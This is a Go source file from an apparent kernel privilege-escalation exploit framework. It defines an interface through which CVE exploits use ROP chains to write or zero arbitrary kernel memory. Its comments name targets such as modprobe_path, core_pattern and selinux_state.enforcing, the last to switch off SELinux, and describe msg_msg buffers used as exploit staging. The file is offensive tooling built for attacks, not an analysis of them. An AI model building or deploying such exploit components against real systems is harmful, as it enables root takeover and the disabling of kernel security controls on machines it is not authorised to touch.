package kernelprivesc

// KernelWritePrimitive writes bytes to a kernel virtual address via the CVE's
// ROP (or equivalent) write primitive. Each kernel write-prim CVE implements
// this; the escalation methods in this package consume it.
//
// Implementations append a memcpy/memset ROP segment that executes when the
// pivot fires. The content to be written must live in a controlled,
// kernel-readable buffer whose absolute address the implementation knows
// (e.g. the msg_msg body in CVE-2026-23111). WriteKmem/MemsetKmem return
// immediately after arranging the segment; the actual write happens when the
// pivot thread runs the ROP.
type KernelWritePrimitive interface {
	ExpName() string

	// WriteKmem arranges a memcpy(kaddr, &content, len(content)) ROP segment.
	// content is captured by reference; the implementation must keep it alive
	// and kernel-readable until the pivot fires.
	WriteKmem(kaddr uint64, content []byte) error

	// MemsetKmem arranges a memset(kaddr, fill, n) ROP segment. Used to zero
	// selinux_state.enforcing, etc.
	MemsetKmem(kaddr uint64, fill byte, n uint64) error

	// Kaddr resolves a logical symbol name to its runtime kernel virtual
	// address (kbase + offset). Recognized names: "modprobe_path",
	// "core_pattern", "selinux_state", "poweroff_cmd". Returns an error for
	// unknown symbols so methods can degrade gracefully (e.g. skip selinux
	// zeroing on kernels without selinux).
	Kaddr(symbol string) (uint64, error)
}
